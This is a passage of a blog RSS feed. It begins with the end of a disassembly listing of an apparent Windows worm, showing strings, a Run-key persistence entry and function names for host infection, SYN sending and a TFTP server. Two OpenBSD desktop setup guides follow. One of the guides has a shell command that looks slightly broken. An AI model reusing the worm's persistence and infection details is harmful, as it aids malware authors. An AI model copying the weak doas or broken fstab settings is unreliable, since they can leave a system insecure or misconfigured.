.data:0040482B aI_I_I_I        db &#39;%i.%i.%i.%i&#39;,0      ; DATA XREF: infect20Hosts+8C^o
.data:0040482B                                         ; sendTCP80SYN+66^o
.data:00404837 aRb             db &#39;rb&#39;,0               ; DATA XREF: TFTPServerThread+BA^o
.data:0040483A aM              db &#39;M&#39;,0                ; DATA XREF: WinMain+2CB^o
.data:0040483C aD              db &#39;d&#39;,0                ; DATA XREF: WinMain+2B2^o
.data:0040483E a_              db &#39;.&#39;,0                ; DATA XREF: WinMain+18C^o
.data:0040483E                                         ; WinMain+1AE^o ...
.data:00404840 aS              db &#39;%s&#39;,0               ; DATA XREF: WinMain+17B^o
.data:00404843 aBilly          db &#39;BILLY&#39;,0            ; DATA XREF: WinMain+4F^o
.data:00404849 aWindowsAutoUpd db &#39;windows auto update&#39;,0 ; DATA XREF: WinMain+3A^o
.data:0040485D aSoftwareMicros db &#39;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#39;,0
.data:0040485D                                         ; DATA XREF: WinMain+20^o
.data:0040488B                 align 4
.data:0040488B _data           ends
.data:0040488B 
.idata:004051C8 ; 
.idata:004051C8 ; Imports from WS2_32.DLL
.idata:004051C8 ; 
.idata:004051C8 ; Section 4. (virtual address 00005000)
.idata:004051C8 ; Virtual size                  : 000006C0 (   1728.)
.idata:004051C8 ; Section size in file          : 000006C0 (   1728.)
.idata:004051C8 ; Offset to raw data for section: 00002400
.idata:004051C8 ; Flags C0000060: Text Data Readable Writable
.idata:004051C8 ; Alignment     : 16 bytes ?
.idata:004051C8 ; ---------------------------------------------------------------------------
.idata:004051C8 
.idata:004051C8 ; Segment type: Externs
.idata:004051C8 ; _idata
.idata:004051C8 ; u_short __stdcall __imp_htons(u_short hostshort)
.idata:004051C8                 extrn __imp_htons:dword ; DATA XREF: htons^r
.idata:004051CC ; int __stdcall __imp_ioctlsocket(SOCKET s,__int32 cmd,u_long *argp)
.idata:004051CC                 extrn __imp_ioctlsocket:dword ; DATA XREF: ioctlsocket^r
.idata:004051D0 ; unsigned __int32 __stdcall __imp_inet_addr(const char *cp)
.idata:004051D0                 extrn __imp_inet_addr:dword ; DATA XREF: inet_addr^r
.idata:004051D4 ; char *__stdcall __imp_inet_ntoa(struct in_addr in)
.idata:004051D4                 extrn __imp_inet_ntoa:dword ; DATA XREF: inet_ntoa^r
.idata:004051D8 ; int __stdcall __imp_recvfrom(SOCKET s,char *buf,int len,int flags,struct sockaddr *from,int *fromlen)
.idata:004051D8                 extrn __imp_recvfrom:dword ; DATA XREF: recvfrom^r
.idata:004051DC ; int __stdcall __imp_select(int nfds,fd_set *readfds,fd_set *writefds,fd_set *exceptfds,const struct timeval *timeout)
.idata:004051DC                 extrn __imp_select:dword ; DATA XREF: select^r
.idata:004051E0 ; int __stdcall __imp_send(SOCKET s,const char *buf,int len,int flags)
.idata:004051E0                 extrn __imp_send:dword  ; DATA XREF: send^r
.idata:004051E4 ; int __stdcall __imp_sendto(SOCKET s,const char *buf,int len,int flags,const struct sockaddr *to,int tolen)
.idata:004051E4                 extrn __imp_sendto:dword ; DATA XREF: sendto^r
.idata:004051E8 ; int __stdcall __imp_setsockopt(SOCKET s,int level,int optname,const char *optval,int optlen)
.idata:004051E8                 extrn __imp_setsockopt:dword ; DATA XREF: setsockopt^r
.idata:004051EC ; SOCKET __stdcall __imp_socket(int af,int type,int protocol)
.idata:004051EC                 extrn __imp_socket:dword ; DATA XREF: socket^r
.idata:004051F0 ; struct hostent *__stdcall __imp_gethostbyname(const char *name)
.idata:004051F0                 extrn __imp_gethostbyname:dword ; DATA XREF: gethostbyname^r
.idata:004051F4 ; int __stdcall __imp_bind(SOCKET s,const struct sockaddr *name,int namelen)
.idata:004051F4                 extrn __imp_bind:dword  ; DATA XREF: bind^r
.idata:004051F8 ; int __stdcall __imp_gethostname(char *name,int namelen)
.idata:004051F8                 extrn __imp_gethostname:dword ; DATA XREF: gethostname^r
.idata:004051FC ; int __stdcall __imp_closesocket(SOCKET s)
.idata:004051FC                 extrn __imp_closesocket:dword ; DATA XREF: closesocket^r
.idata:00405200 ; int __stdcall __imp_WSAStartup(WORD wVersionRequested,LPWSADATA lpWSAData)
.idata:00405200                 extrn __imp_WSAStartup:dword ; DATA XREF: WSAStartup^r
.idata:00405204 ; int _imp_WSACleanup(void)
.idata:00405204                 extrn __imp_WSACleanup:dword ; DATA XREF: WSACleanup^r
.idata:00405208 ; int __stdcall __imp_connect(SOCKET s,const struct sockaddr *name,int namelen)
.idata:00405208                 extrn __imp_connect:dword ; DATA XREF: connect^r
.idata:0040520C ; int __stdcall __imp_getpeername(SOCKET s,struct sockaddr *name,int *namelen)
.idata:0040520C                 extrn __imp_getpeername:dword ; DATA XREF: getpeername^r
.idata:00405210 ; int __stdcall __imp_getsockname(SOCKET s,struct sockaddr *name,int *namelen)
.idata:00405210                 extrn __imp_getsockname:dword ; DATA XREF: getsockname^r
.idata:00405214 ; SOCKET __stdcall __imp_WSASocketA(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags)
.idata:00405214                 extrn __imp_WSASocketA:dword ; DATA XREF: WSASocketA^r
.idata:00405218 
.idata:0040521C 
.idata:00405220 ; 
.idata:00405220 ; Imports from WININET.DLL
.idata:00405220 ; 
.idata:00405220                 extrn __imp_InternetGetConnectedState:dword
.idata:00405220                                         ; DATA XREF: InternetGetConnectedState^r
.idata:00405224 
.idata:00405228 
.idata:0040522C ; 
.idata:0040522C ; Imports from KERNEL32.DLL
.idata:0040522C ; 
.idata:0040522C ; void __stdcall __imp_ExitProcess(UINT uExitCode)
.idata:0040522C                 extrn __imp_ExitProcess:dword ; DATA XREF: ExitProcess^r
.idata:00405230 ; void __stdcall __imp_ExitThread(DWORD dwExitCode)
.idata:00405230                 extrn __imp_ExitThread:dword ; DATA XREF: ExitThread^r
.idata:00405234 ; LPSTR _imp_GetCommandLineA(void)
.idata:00405234                 extrn __imp_GetCommandLineA:dword
.idata:00405234                                         ; DATA XREF: GetCommandLineA^r
.idata:00405238 ; int __stdcall __imp_GetDateFormatA(LCID Locale,DWORD dwFlags,const SYSTEMTIME *lpDate,LPCSTR lpFormat,LPSTR lpDateStr,int cchDate)
.idata:00405238                 extrn __imp_GetDateFormatA:dword
.idata:00405238                                         ; DATA XREF: GetDateFormatA^r
.idata:0040523C ; DWORD _imp_GetLastError(void)
.idata:0040523C                 extrn __imp_GetLastError:dword ; DATA XREF: GetLastError^r
.idata:00405240 ; DWORD __stdcall __imp_GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)
.idata:00405240                 extrn __imp_GetModuleFileNameA:dword
.idata:00405240                                         ; DATA XREF: GetModuleFileNameA^r
.idata:00405244 ; HMODULE __stdcall __imp_GetModuleHandleA(LPCSTR lpModuleName)
.idata:00405244                 extrn __imp_GetModuleHandleA:dword
.idata:00405244                                         ; DATA XREF: GetModuleHandleA^r
.idata:00405248 ; BOOL __stdcall __imp_CloseHandle(HANDLE hObject)
.idata:00405248                 extrn __imp_CloseHandle:dword ; DATA XREF: CloseHandle^r
.idata:0040524C ; DWORD _imp_GetTickCount(void)
.idata:0040524C                 extrn __imp_GetTickCount:dword ; DATA XREF: GetTickCount^r
.idata:00405250                 extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwind^r
.idata:00405254 ; HANDLE __stdcall __imp_CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName)
.idata:00405254                 extrn __imp_CreateMutexA:dword ; DATA XREF: CreateMutexA^r
.idata:00405258 ; void __stdcall __imp_Sleep(DWORD dwMilliseconds)
.idata:00405258                 extrn __imp_Sleep:dword ; DATA XREF: Sleep^r
.idata:0040525C ; BOOL __stdcall __imp_TerminateThread(HANDLE hThread,DWORD dwExitCode)
.idata:0040525C                 extrn __imp_TerminateThread:dword
.idata:0040525C                                         ; DATA XREF: TerminateThread^r
.idata:00405260 ; HANDLE __stdcall __imp_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,DWORD dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId)
.idata:00405260                 extrn __imp_CreateThread:dword ; DATA XREF: CreateThread^r
.idata:00405264 
.idata:00405268 
.idata:0040526C ; 
.idata:0040526C ; Imports from ADVAPI32.DLL
.idata:0040526C ; 
.idata:0040526C ; LONG __stdcall __imp_RegCloseKey(HKEY hKey)
.idata:0040526C                 extrn __imp_RegCloseKey:dword ; DATA XREF: RegCloseKey^r
.idata:00405270 ; LONG __stdcall __imp_RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,LPDWORD lpdwDisposition)
.idata:00405270                 extrn __imp_RegCreateKeyExA:dword
.idata:00405270                                         ; DATA XREF: RegCreateKeyExA^r
.idata:00405274 ; LONG __stdcall __imp_RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,const BYTE *lpData,DWORD cbData)
.idata:00405274                 extrn __imp_RegSetValueExA:dword
.idata:00405274                                         ; DATA XREF: RegSetValueExA^r
.idata:00405278 
.idata:0040527C 
.idata:00405280 ; 
.idata:00405280 ; Imports from CRTDLL.DLL
.idata:00405280 ; 
.idata:00405280                 extrn __imp___GetMainArgs:dword ; DATA XREF: __GetMainArgs^r
.idata:00405284 ; int __cdecl _imp_atoi(const char *)
.idata:00405284                 extrn __imp_atoi:dword  ; DATA XREF: atoi^r
.idata:00405288 ; void __cdecl _imp_exit(int)
.idata:00405288                 extrn __imp_exit:dword  ; DATA XREF: exit^r
.idata:0040528C                 extrn __imp_fclose:dword ; DATA XREF: fclose^r
.idata:00405290                 extrn __imp_fopen:dword ; DATA XREF: fopen^r
.idata:00405294                 extrn __imp_fread:dword ; DATA XREF: fread^r
.idata:00405298 ; void *__cdecl _imp_memcpy(void *,const void *,size_t)
.idata:00405298                 extrn __imp_memcpy:dword ; DATA XREF: memcpy^r
.idata:0040529C ; void *__cdecl _imp_memset(void *,int,size_t)
.idata:0040529C                 extrn __imp_memset:dword ; DATA XREF: memset^r
.idata:004052A0                 extrn __imp_raise:dword ; DATA XREF: raise^r
.idata:004052A4 ; int _imp_rand(void)
.idata:004052A4                 extrn __imp_rand:dword  ; DATA XREF: rand^r
.idata:004052A8                 extrn __imp_signal:dword ; DATA XREF: signal^r
.idata:004052AC                 extrn __imp_sprintf:dword ; DATA XREF: sprintf^r
.idata:004052B0 ; void __cdecl _imp_srand(unsigned int)
.idata:004052B0                 extrn __imp_srand:dword ; DATA XREF: srand^r
.idata:004052B4 ; char *__cdecl _imp_strchr(const char *,int)
.idata:004052B4                 extrn __imp_strchr:dword ; DATA XREF: strchr^r
.idata:004052B8 ; char *__cdecl _imp_strtok(char *,const char *)
.idata:004052B8                 extrn __imp_strtok:dword ; DATA XREF: strtok^r
.idata:004052BC 
.idata:004052BC 
.idata:004052BC 
.idata:004052BC                 end start

</code></pre>

]]></description>
</item>

<item>
<guid>/articles/openbsd_minimalist_desktop.html</guid>
<link>/articles/openbsd_minimalist_desktop.html</link>
<pubDate>Sun, 16 Oct 2022 00:00:00 +0100</pubDate>
<title>OpenBSD Minimalist Desktop</title>
<description><![CDATA[

<h1 id="openbsd-minimalist-desktop">OpenBSD Minimalist Desktop</h1>

<p>It has been a few years since I last wrote about OpenBSD on the desktop (or laptop), and support for modern hardware has continued to improve. In fact, I even run OpenBSD on an Apple Macbook Pro M1&#47;Silicon now!</p>

<p>I was going to update the previous article but as my own habits have changed quite a lot and are more in line with the spirit of the OpenBSD base, it seemed like a new article was warranted. I may update this article in the future with &#8216;rice&#8217; for cwm(1) (including Xresources, etc) but at present this is a basic guide to getting a generic desktop system up and running.</p>

<p>It is customary when mentioning any command, file, or topic that has a manual page to include which manual it&#8217;s included in. So when you see <code>cwm(1)</code> - I am referring to cwm in the General Commands manual, which is manual 1. To read that manual page, type: man 1 cwm (though <code>man cwm</code> will default to cwm(1)).</p>

<p>Hardware: Lenovo Thinkpad X280 (8GB RAM &#47; 256GB NVMe &#47; Intel Wifi)</p>

<p><a href="/productivity.png"><img src="/productivity.png" alt="OpenBSD productivity" /></a></p>

<p>Grab install71.img from https:&#47;&#47;cdn.openbsd.org&#47;pub&#47;OpenBSD&#47;7.1&#47;amd64&#47; and write it to a USB flash disk. On a Unix-like operating system dd can be used to accomplish this:</p>

<pre><code>dd if=install71.img of=&#47;dev&#47;sdb bs=1M conv=fsync
</code></pre>

<p>When installing OpenBSD I always use softraid(8) CRYPTO to encrypt my system. Instructions to do this are in the <a href="https://openbsd.org/faq/faq14.html#softraidFDE">OpenBSD FAQ</a>.</p>

<p>The default disklabel(8) layout is recommended for most situations, however, if you will be compiling a lot of ports you may want to edit the default layout to make more space in &#47;usr&#47;src and &#47;usr&#47;obj; here is what I ended up with:</p>

<pre><code>OpenBSD area: 1024-500116574; size: 238.5G; free: 0.0G
#                size           offset  fstype [fsize bsize   cpg]
  a:             1.0G             1024  4.2BSD   2048 16384 12960 # &#47;
  b:             8.1G          2098176    swap                    # none
  c:           238.5G                0  unused
  d:            16.0G         19086080  4.2BSD   2048 16384 12960 # &#47;tmp
  e:            20.0G         52644992  4.2BSD   2048 16384 12960 # &#47;var
  f:            10.0G         94590720  4.2BSD   2048 16384 12960 # &#47;usr
  g:             4.0G        115571584  4.2BSD   2048 16384 12960 # &#47;usr&#47;X11R6
  h:            30.0G        123973600  4.2BSD   2048 16384 12960 # &#47;usr&#47;local
  i:             0.0G               64   MSDOS
  j:            12.0G        186900192  4.2BSD   2048 16384 12960 # &#47;usr&#47;src
  k:            16.0G        212074048  4.2BSD   2048 16384 12960 # &#47;usr&#47;obj
  l:           121.3G        245633824  4.2BSD   2048 16384 12960 # &#47;home
</code></pre>

<h3 id="firmware-and-networking">Firmware and networking</h3>

<p>OpenBSD detects the iwm(8) 802.11x wireless device but will need the firmware for it to be functional. If you have a supported USB adapter or Lenovo&#8217;s adapter cable for the built-in em(8) ethernet device you can skip the following step as OpenBSD will run fw_update(8) on first boot if your network is configured correctly.</p>

<p>On another computer with network access, format a USB disk as FAT and copy everything from http:&#47;&#47;firmware.openbsd.org&#47;firmware&#47;7.2&#47; onto it. I find the easiest way to grab these files on a non-OpenBSD system is to install and use lftp:</p>

<pre><code>$ lftp http:&#47;&#47;firmware.openbsd.org&#47;firmware&#47;7.2&#47;
cd ok, cwd=&#47;firmware&#47;7.2
lftp firmware.openbsd.org:&#47;firmware&#47;7.2&#62; mget *
</code></pre>

<p>Unmount the disk and keep it for the first boot after installation.</p>

<p><a href="/chat.png"><img src="/chat.png" alt="OpenBSD+cwm+xterm+tmux+cplay+weechat" /></a></p>

<h3 id="first-boot">First boot</h3>

<h4 id="firmware">Firmware</h4>

<p>Insert your USB disk with the firmware, mount it, copy the firmware over and install it:</p>

<pre><code># dmesg | grep sd
# mount_msdos &#47;dev&#47;sd3i &#47;mnt
# mkdir &#47;home&#47;firmware
# cp &#47;mnt&#47;firmware&#47;* &#47;home&#47;firmware&#47;
# mv &#47;home&#47;firmware&#47;SHA256.SIG &#47;home&#47;firmware&#47;SHA256.sig
# fw_update -p &#47;home&#47;firmware&#47;
</code></pre>

<h4 id="connecting-to-wifi">Connecting to Wifi</h4>

<p>If you skipped setting up wifi during installation, you can do so now by editing hostname.if(5), where <code>if</code> is your wifi interface. Running ifconfig(8) can help you identify the interface. For Intel 7000-9000 based cards such as on this Thinkpad, the device is iwm0.</p>

<p>&#47;etc&#47;hostname.iwm0:</p>

<pre><code>join somewifinet wpakey mywpapassphrase
inet autoconf
</code></pre>

<p>That&#8217;s it. When you next reboot it will connect automatically. If you ever need to manually reset your network interfaces and bring them back up, see netstart(8). For example:</p>

<pre><code>sh &#47;etc&#47;netstart iwm0
</code></pre>

<h4 id="performance">Performance</h4>

<p>It is recommended to disable the updating of atime (access time) on filesystems with heavy usage such as laptops or NNTP servers where disk performance is more important than maintaining accurate file access times.</p>

<p>For user data (&#47;home), we can increase performance by using the softdep (soft dependencies) mount option which prevents filesystem metadata from being written immediately. This isn&#8217;t recommended for critical filesystem mountpoints where it can cause problems but for user data it is generally safe.</p>

<p>See mount(8).</p>

<pre><code># fstab=${mktemp}
# cp &#47;etc&#47;fstab "$fstab" &#38;&#38;
   cat $fstab | awk &#39;&#47;rw&#47; {sub(&#47;rw&#47;,"rw,noatime")}1&#39;
   | awk &#39;&#47;home&#47; {sub(&#47;noatime&#47;,"noatime,softdep")}1&#39; &#62; &#47;etc&#47;fstab
</code></pre>

<p>The resulting <code>&#47;etc&#47;fstab</code> file should look something like the following:</p>

<pre><code>e123eac9a466a7c7.b none swap sw
e123eac9a466a7c7.a &#47; ffs rw,noatime 1 1
e123eac9a466a7c7.l &#47;home ffs rw,noatime,softdep,nodev,nosuid 1 2
e123eac9a466a7c7.d &#47;tmp ffs rw,noatime,nodev,nosuid 1 2
e123eac9a466a7c7.f &#47;usr ffs rw,noatime,nodev 1 2
e123eac9a466a7c7.g &#47;usr&#47;X11R6 ffs rw,noatime,nodev 1 2
e123eac9a466a7c7.h &#47;usr&#47;local ffs rw,noatime,wxallowed,nodev 1 2
e123eac9a466a7c7.k &#47;usr&#47;obj ffs rw,noatime,nodev,nosuid 1 2
e123eac9a466a7c7.j &#47;usr&#47;src ffs rw,noatime,nodev,nosuid 1 2
e123eac9a466a7c7.e &#47;var ffs rw,noatime,nodev,nosuid 1 2
</code></pre>

<p>It is also desirable, especially on a laptop, to have the Advanced Power Management daemon running in automatic mode.</p>

<pre><code># rcctl enable apmd
# rcctl set apmd flags -A
</code></pre>

<p>One side effect of this on some systems is that the CPU will run at full speed when connected to AC and at its lowest speed when on battery. One workaround is to use the -L flag (manual mode, hw.setperf=0) then use something like <a href="https://tildegit.org/solene/obsdfreqd">obsdfreqd</a> - which facilitates userland CPU frequency scheduling.</p>

<h4 id="xenocara-xenodm1">Xenocara &#47; xenodm(1)</h4>

<p>Xenocara is OpenBSD&#8217;s infrastructure for the X(7).org Server and window managers included in base - cwm(1) and fvwm(1).</p>

<p>xenodm(1) is the X(1) Display Manager which manages access to the Xserver(1), providing a graphical login interface.</p>

<p>By default, xconsole(1) is started by xenodm(1) and the background set to the familiar (and perhaps ugly) root weave pattern. We can easily remove these in &#47;etc&#47;X11&#47;xenodm&#47;Xsetup_0, have the background set to a solid dark grey colour and disable the system bell:</p>

<pre><code># sed -i &#39;&#47;${exec&#47;s&#47;^&#47;#&#47;g&#39; &#47;etc&#47;X11&#47;xenodm&#47;Xsetup_0
# PREF="\${exec_prefix}&#47;bin" &#38;&#38;
    echo "$PREF&#47;xsetroot -solid dimgrey
$PREF&#47;xset b off
" &#62;&#62; &#47;etc&#47;X11&#47;xenodm&#47;Xsetup_0
</code></pre>

<h4 id="add-your-user-to-staff-and-doas.conf5">Add your user to staff and doas.conf(5)</h4>

<p>It&#8217;s not recommended to normally login as the root user. For a long time, Unix-like operating systems relied on <code>sudo</code> to perform operations as another user (such as root); in 2015 Ted Unangst developed doas(1) for OpenBSD as a safer and simpler replacement.</p>

<p>Let&#8217;s allow any user in the wheel group(5) to execute commands as root with doas(1):</p>

<pre><code># echo "permit :wheel" &#62;&#62; &#47;etc&#47;doas.conf
</code></pre>

<p>In addition to groups such as wheel, OpenBSD (like other BSD operating systems) maintains a login class capability database that is configured in login.conf(5). This allows fine-tuning of resources for users and processes in a robust yet simple way. On a desktop or laptop, the user we created is probably going to be our only human user so we should add it to the staff class and increase resources to ensure we can use the system as a daily driver:</p>

<pre><code># usermod -L staff myuser
# usermod -G staff myuser
</code></pre>

<p>In `&#47;etc&#47;login.conf&#8217; update the staff class as follows using vi(1):</p>

<pre><code>staff:\
    :datasize-cur=4096M:\
    :datasize-max=infinity:\
    :maxproc-max=512:\
    :maxproc-cur=256:\
    :openfiles-cur=4096:\
    :openfiles-max=4096:\
:ignorenologin:\
:requirehome@:\
:tc=default:
</code></pre>

<p>You should increase datasize-cur depending on your total memory. 4096M works relatively well for 8GB though I have noticed with excessive web browser use that things can freeze up. Likewise, openfiles-cur&#47;max should be increased depending on your needs. If you run Syncthing or work with large Bittorrent files for example you will probably want to increase that to an insane amount and replicate it in &#47;etc&#47;sysctl.conf(5): kern.maxfiles.</p>

<p>Build the database:</p>

<pre><code>cap_mkdb &#47;etc&#47;login.conf
</code></pre>

<h4 id="kernel-settings">Kernel settings</h4>

<p>Here are some recommended sysctl(2) values (based on this system) for a desktop to add to &#47;etc&#47;sysctl.conf(5):</p>

<pre><code>cat &#60;&#60;EOF &#62; &#47;etc&#47;sysctl.conf
kern.maxproc=4096
kern.maxthread=4096
kern.maxfiles=32768
EOF
</code></pre>

<h4 id="x-session">X Session</h4>

<p>To enable tap-to-click on the trackpad:</p>

<pre><code># echo "mouse.tp.tapping=1" &#62;&#62; &#47;etc&#47;wsconsctl.conf
</code></pre>

<p>Now exit then login as your regular user and create <code>.xsession</code> in your home directory with the following:</p>

<pre><code># Set your locale(1)
export LANG=en_US.UTF-8

# Set your environment (korn shell)
export ENV=$HOME&#47;.kshrc

# No core dumps!
ulimit -Sc 0

# Merge our X resources
xrdb -merge $HOME&#47;.Xresources

# Set background colour
setroot -solid dimgrey

# Make sure that bell is off!
xset b off

# Use Capslock as CTRL
setxkbmap -option ctrl:nocaps

# Run xterm
xterm &#38;

# Fix scaling of some X&#47;QT programs
xrandr --dpi 96

# Automatically lock X
xidle -delay 5 -sw -timeout 300 -program "&#47;usr&#47;X11R6&#47;bin&#47;xlock -mode qix" &#38;

# Run our window manager.
# Can later be replaced with `exec startxfce4` if desired.
# exec runs it in the foreground - X will exit when the cwm proc exits.
exec cwm
</code></pre>

<p>At this point we should <code>reboot(8)</code> - then we can benefit from our disk performance tweaks which you will be thankful for when installing packages.</p>

<p><a href="/newdesktop.jpg"><img src="/newdesktop.jpg" alt="OpenBSD with cwm, tmux, newsboat, neomutt." /></a></p>

<h3 id="second-boot">Second boot</h3>

<p>If you didn&#8217;t make any typos, you should be greeted by xenodm(1) again and able to login as your normal staff user before being presented with a terminal.</p>

<p>Hopefully the network will be up now too, in which case we should update the system using syspatch(8) and reboot again:</p>

<pre><code>$ doas syspatch
$ doas reboot
</code></pre>

<h4 id="customisation">Customisation</h4>

<p>Let&#8217;s install some packages, adjusting to your own taste:</p>

<pre><code>$ doas pkg_add ImageMagick \
            bzip2 \
    git \
    gnupg \
    firefox \
    iridium \
    w3m \
    mpv \
    inconsolata-font \
    spleen \
    ffmpeg \
    unzip \
    keepassxc \
    weechat \
    picom \
        mupdf \
        weechat \
        cplay \
        cmus \
        newsboat \
        neomutt \
        vim
</code></pre>

<p>If you would prefer a more familiar desktop environment, xfce can be installed:</p>

<pre><code>$ doas pkg_add xfce xfce-extras xfce4-power-manager upower xscreensaver
</code></pre>

<p>Then in .xsession, replace <code>exec cwm</code> with <code>exec startxfce4</code> and remove the xidle and xterm lines.</p>

<p>If you are not using xfce, then you will need to enable messagebus&#47;dbus with:</p>

<pre><code>$ doas rcctl enable messagebus
</code></pre>

<p>or by adding the following to .xsession:</p>

<pre><code>if [ -x &#47;usr&#47;local&#47;bin&#47;dbus-launch -a -z "${DBUS_SESSION_BUS_ADDRESS}" ]; then
  eval `dbus-launch --sh-syntax --exit-with-x11`
fi
</code></pre>

<p>NOTE: jmclnx <a href="https://news.ycombinator.com/item?id=33237968">made a point</a> about dbus on Hacker News - he actually avoids running it and Firefox still runs fine. If you want to try this out instead of the GTK IPC bloat, add the following to your .xsession:</p>

<pre><code>export DBUS_SESSION_BUS_ADDRESS="no"
</code></pre>

<h4 id="xresources">Xresources</h4>

<p>You could write a book, or at least a pamphlet, on styling X(7). <a href="https://www.c0ffee.net/blog/openbsd-on-a-laptop/">Cullum Smith</a> has some more complete configs, but the following ~&#47;.Xresources file will at least get you started with a less-ugly xterm to use in cwm(1):</p>

<pre><code>*visualBell: True
xterm.loginShell: true
xterm*faceName: Inconsolata:size=16
! xterm*dynamicColors: true
xterm*utf8: 2
xterm*eightBitInput: true
xterm*scrollBar: false
! xterm*foreground: rgb:a8&#47;a8&#47;a8
! xterm*background: rgb:00&#47;00&#47;00

*background             : #171717
*foreground             : #F8F8F8
! black
*color0                         : #171717
*color8                         : #38252C
! red
*color1                         : #D81765
*color9                         : #FF0000
! green
*color2                         : #97D01A
*color10                        : #76B639
! yellow
*color3                         : #FFA800
*color11                        : #E1A126
! blue
*color4                         : #16B1FB
*color12                        : #289CD5
! magenta
*color5                         : #FF2491
*color13                        : #FF2491
! cyan
*color6                         : #0FDCB6
*color14                        : #0A9B81
! white
*color7                         : #EBEBEB
*color15                        : #F8F8F8
</code></pre>

<h4 id="cwmrc5">cwmrc(5)</h4>

<p>A minimal ~&#47;.cwmrc configuration:</p>

<pre><code>fontname "Inconsolata:pixelsize=14:bold"
sticky yes
snapdist                20

command firefox         firefox
command newsboat        "xterm -e newsboat"
command keepassxc       keepassxc

bind-key 4-Return       terminal
bind-key CM-Return      "xterm -e top"
bind-key C4-equal       window-vmaximize
bind-key C4S-equal      window-hmaximize
bind-key 4-1           group-only-1
bind-key 4-2           group-only-2
bind-key 4-3           group-only-3
bind-key C4-1          window-movetogroup-1
bind-key C4-2          window-movetogroup-2
bind-key C4-3          window-movetogroup-3
bind-key M-j            window-cycle
bind-key M-k            window-cycle
bind-key M-t            window-maximize
bind-key M-v            window-vtile

bind-key 4-b            "xbacklight -dec 10 -time 0"
bind-key 4S-b           "xbacklight -inc 10 -time 0"
</code></pre>

<p>cwm(1) can take some getting used to if you are more accustomed to a traditional desktop environment but with a little effort to learn to use it efficiently you will find it increases your productivity and decreases your dependence on the mouse or trackpad.</p>

<p>In the above example, pressing WINDOWS+Return will spawn a terminal.</p>

<h4 id="miscellaneous">Miscellaneous</h4>

<p>If you have performance issues in Firefox, in the navigation bar type: about:config <em>enter</em> then search for and enable this option:</p>

<pre><code>layers.acceleration.force-enable=true
</code></pre>

<p>GTK Annoyance - keyboard shortcuts don&#8217;t work as expected (CTRL-A to select all, for example). I have borrowed this from <a href="https://www.c0ffee.net/blog/openbsd-on-a-laptop/">Cullum Smith</a> as I had no idea why it was happening - I don&#8217;t use emacs, I like CTRL-A to work normally in GTK apps, it feels natural!</p>

<p>Create ~&#47;.config&#47;gtk-3.0&#47;settings.ini and add the lines below to it. Check out the other options available from <a href="https://www.c0ffee.net/blog/openbsd-on-a-laptop">Cullum&#8217;s post</a>.</p>

<pre><code>[Settings]
gtk-key-theme-name=Default
</code></pre>

<p><a href="/neofetch.png"><img src="/neofetch.png" alt="OpenBSD+cwm" /></a></p>

]]></description>
</item>

<item>
<guid>/articles/openbsd_desktop.html</guid>
<link>/articles/openbsd_desktop.html</link>
<pubDate>Mon, 03 Dec 2018 00:00:00 +0000</pubDate>
<title>OpenBSD Desktop</title>
<description><![CDATA[

<h1 id="openbsd-desktop">OpenBSD Desktop</h1>

<p>Everyone loves an OpenBSD Desktop article, don&#8217;t they? So there seems very little point in me reiterating what is a relatively simple process nowadays.  That said, after the install process there are a couple of things which, for me, make OpenBSD the perfect workstation operating system&#8230;</p>

<p><a href="/desktop.png"><img src="/desktop.png" alt="OpenBSD+ratpoison+urxvt+tmux" /></a></p>

<p><strong>TLDR: SCROLL DOWN</strong></p>

<p>In recent years, OpenBSD has become more popular as a desktop&#47;workstation OS, which is quite surprising to many who consider it to be an arcane incarnation of BSD that&#8217;s used only by tinfoil hatters, the BGP bourgeosie, and minimalist mashochists. Improved hardware support, the clean and ~perfect code style, a consistent environment, and the ease of configuration may be some reasons for people moving to the distro.</p>

<p>Personally, I used OpenBSD for years on bare-metal and VM servers as well as building a liveCD distro for occasional use before adopting it full-time.  Out of the box, it is faster and easier to configure than FreeBSD and even most linux distros.  I do still love FreeBSD, but it lacks <em>je ne sais quoi</em> that OpenBSD has at a base level which enables fast configuration and usability whatever you&#8217;re using it on.</p>

<p>I use a clean, minimalist system which maximises productivity without having a bloated userland; here&#8217;s how to reproduce a basic version of it. I am stuck in my ways and haven&#8217;t migrated to cwm(1) yet; also, in the initial version of this article I confused cwm with fvwm because I have fvwm as my wm on another box. Normally I use rxvt-unicode over xterm with ratpoison but following feedback about using a terminal emulator not in base I have modified this article to use xterm; I&#8217;ve also started using a <a href="http://st.suckless.org/patches/solarized/">solarized build of st</a> - but that isn&#8217;t covered here.</p>

<p><strong>TLDR: Start here</strong></p>

<p>First, if you haven&#8217;t done so already, add your user to doas.conf(5), make some performance tweaks to our filesystems in &#47;etc&#47;fstab(5) and grant us more memory (assuming you have at least 4GB) in login.conf(5) (from xterm in cwm):</p>

<pre><code>$ su root -c &#39;vi &#47;etc&#47;doas.conf&#39;
permit nopass keepenv yourusername
$ doas sed -i &#39;s&#47;rw&#47;rw,softdep,noatime&#47;g&#39; &#47;etc&#47;fstab
$ doas sed -i &#39;s&#47;768M&#47;2048M&#47;g&#39; &#47;etc&#47;login.conf 
$ doas reboot
</code></pre>

<p>Install some packages:</p>

<pre><code>pkg_add ImageMagick \
    bzip2 \
    git \
    gnupg \
    iridium \
    w3m \
    mpv \
    inconsolata-font \
    mupdf \
    ratpoison \
    rsync \
    tor-browser \
    rtorrent \
    unzip
</code></pre>

<p>You would be surprised at how many packages in base can do the things you need&#8230; ftp(1) for example is not just an ftp client, but can be used like &#8216;fetch&#8217; to download files over FTP, HTTP, and HTTPS.
 But there are a few packages I consider &#8216;essential&#8217; listed above, some of which you may not know:</p>

<ul>
